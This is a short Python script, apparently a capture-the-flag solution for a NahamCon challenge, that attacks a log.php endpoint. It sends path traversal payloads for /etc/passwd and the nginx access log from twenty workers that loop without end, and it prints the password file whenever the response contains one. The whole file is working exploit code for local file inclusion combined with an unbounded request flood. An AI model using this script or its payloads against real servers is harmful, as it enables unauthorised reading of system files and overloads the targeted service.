import asyncio
import httpx

TARGET = "http://challenge.nahamcon.com:31061/api/log.php"
paths = [
    "../../../../../../../var/log/nginx/access.log",
    "../../../../../../../etc/passwd"
]

async def send_request(client, path):
    try:
        resp = await client.get(TARGET, params={"log": path})
        text = resp.text

        if "root:x" in text:
            print(f"[+] Found /etc/passwd via {path}")
            print(text[:300])  # 너무 길면 일부만 출력

    except Exception:
        pass

async def worker(path):
    async with httpx.AsyncClient() as client:
        while True:
            await send_request(client, path)

async def main():
    tasks = []
    for _ in range(10):
        tasks.append(asyncio.create_task(worker(paths[0])))  # access.log
        tasks.append(asyncio.create_task(worker(paths[1])))  # etc/passwd
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())